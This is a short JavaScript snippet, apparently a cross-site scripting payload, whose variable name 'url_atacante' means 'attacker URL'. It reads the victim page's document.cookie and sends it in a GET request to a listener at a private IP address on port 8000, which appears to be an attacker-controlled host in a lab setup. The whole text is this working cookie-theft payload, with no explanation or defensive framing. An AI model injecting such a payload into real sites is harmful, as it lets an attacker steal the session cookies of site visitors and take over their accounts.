var xhttp = new XMLHttpRequest();
cookie = document.cookie;

url_atacante = "http://192.168.232.129:8000/?cookie=" + cookie;

xhttp.open("GET", url_atacante, true);
xhttp.send();
